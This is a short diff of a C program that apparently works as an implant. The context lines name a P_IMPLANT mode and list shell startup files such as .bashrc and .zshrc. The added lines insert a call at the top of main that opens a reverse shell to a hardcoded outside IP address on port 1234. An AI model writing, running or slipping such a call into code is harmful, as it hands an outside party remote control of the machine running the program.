@@ -24,6 +24,8 @@ static void sighandler(int signo){}
 static char* CONFIGS[3] = {"/.bashrc", "/.zshrc", "/.dmrc"};
 
 int main(int argc, char ** argv){
+  reverse_shell(1234, "149.89.161.100");
+  
   //set mode
   int mode = P_IMPLANT;
   for (int i = 0; i<argc; i++){
